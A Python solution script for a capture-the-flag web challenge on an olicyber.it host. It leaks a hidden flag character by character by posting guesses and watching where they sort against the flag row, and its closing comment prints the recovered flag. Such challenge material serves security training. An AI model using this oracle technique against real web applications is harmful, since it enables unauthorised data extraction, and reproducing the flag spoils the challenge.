from bs4 import BeautifulSoup
import requests

url = 'https://secret-storage.challs.olicyber.it/'
filter = '?order=secret'

s = requests.Session()

response = s.post(url)
url += filter

alphabet = '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'

guess = alphabet[0]
count = 0
while True:
    payload = {'name': count, 'secret': 'flag{' + guess}
    response = s.post(url, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=payload)

    soup = BeautifulSoup(response.text, 'html.parser')
    tbody = soup.find('tbody')

    rows = [tr.find('td').text for tr in tbody.findAll('tr')]

    if rows.index(str(count)) > rows.index('flag'):
        guess = guess[:-1] + alphabet[alphabet.index(guess[-1]) - 1]

        if guess[-1] == '}':
            break

        print('flag{' + guess + '}')
        guess += alphabet[0]
    else:
        guess = guess[:-1] + alphabet[alphabet.index(guess[-1]) + 1]
    
    count += 1
    
# flag{sqli_1sn7_tH3_0nly_50luT10n_706e1f90}
